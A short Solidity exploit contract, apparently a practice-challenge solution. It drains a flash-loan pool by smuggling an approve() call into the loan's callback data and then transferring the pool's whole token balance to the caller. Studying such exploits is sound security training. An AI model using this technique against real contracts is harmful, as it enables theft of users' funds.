// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import './TrusterLenderPool.sol';

contract TrusterLenderAttack {
    function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        // Approve this contract to tranfer all the pool's balance
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(_pool));
        pool.flashLoan(0, msg.sender, _token, payload);
        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}
